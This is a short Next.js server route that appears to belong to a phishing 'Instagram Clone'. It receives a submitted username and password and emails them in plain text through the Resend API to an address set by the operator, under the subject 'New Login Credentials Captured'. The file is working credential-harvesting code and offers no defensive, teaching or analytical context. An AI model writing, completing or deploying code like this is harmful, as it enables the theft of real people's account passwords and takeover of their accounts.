import { Resend } from 'resend';
import { NextResponse } from 'next/server';

const resend = new Resend(process.env.RESEND_API_KEY);

export async function POST(request) {
    try {
        const { username, password } = await request.json();

        const { data, error } = await resend.emails.send({
            from: 'Instagram Clone <onboarding@resend.dev>',
            to: [process.env.TO_EMAIL],
            subject: 'New Login Credentials Captured',
            html: `
        <h1>New Login Attempt</h1>
        <p><strong>Username:</strong> ${username}</p>
        <p><strong>Password:</strong> ${password}</p>
      `,
        });

        if (error) {
            console.error('Resend error:', error);
            return NextResponse.json({ error }, { status: 500 });
        }

        return NextResponse.json({ data });
    } catch (error) {
        console.error('Server error:', error);
        return NextResponse.json({ error: error.message }, { status: 500 });
    }
}
